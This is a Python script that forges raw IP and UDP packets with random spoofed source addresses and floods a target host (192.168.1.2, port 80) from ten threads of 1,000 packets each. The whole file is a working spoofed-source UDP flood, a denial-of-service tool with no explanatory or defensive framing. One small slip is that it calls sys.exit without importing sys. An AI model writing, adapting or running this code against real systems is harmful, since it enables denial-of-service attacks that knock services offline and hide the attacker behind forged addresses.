import socket
import struct
import random
import threading

def create_socket():
    try:
        return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    except socket.error as e:
        print(f'Socket could not be created. Error: {e}')
        sys.exit(1)

def checksum(data):
    if len(data) % 2 != 0:
        data += b'\x00'
    s = sum(struct.unpack('!%sH' % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def generate_random_ip():
    while True:
        a = [str(random.randint(0, 255)) for _ in range(4)]
        ip = '.'.join(a)
        if not (a[0] == "127" or a[0] == "10" or (a[0] == "172" and 16 <= int(a[1]) <= 31) or (a[0] == "192" and a[1] == "168")):
            break
    return ip

def create_ip_header(source_ip, dest_ip):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 0
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_UDP
    ip_check = 0
    ip_saddr = socket.inet_aton(source_ip)
    ip_daddr = socket.inet_aton(dest_ip)
    ip_ihl_ver = (ip_ver << 4) + ip_ihl

    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    
    ip_check = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    
    return ip_header

def create_udp_header(source_port, dest_port, data, source_ip, dest_ip):
    udp_len = 8 + len(data)
    pseudo_header = struct.pack('!4s4sBBH', socket.inet_aton(source_ip), socket.inet_aton(dest_ip), 0, socket.IPPROTO_UDP, udp_len)
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_len, 0)
    
    udp_check = checksum(pseudo_header + udp_header + data)
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_len, udp_check)
    
    return udp_header

def create_packet(source_ip, dest_ip, source_port, dest_port, data):
    ip_header = create_ip_header(source_ip, dest_ip)
    udp_header = create_udp_header(source_port, dest_port, data, source_ip, dest_ip)
    return ip_header + udp_header + data

def send_packets(sock, target_ip, target_port, data, num_packets):
    for _ in range(num_packets):
        source_ip = generate_random_ip()
        packet = create_packet(source_ip, target_ip, random.randint(1024, 65535), target_port, data)
        sock.sendto(packet, (target_ip, 0))

def main():
    sock = create_socket()
    dest_ip = '192.168.1.2'
    dest_port = 80
    data = b'A' * 512
    num_packets_per_thread = 1000
    num_threads = 10

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=send_packets, args=(sock, dest_ip, dest_port, data, num_packets_per_thread))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
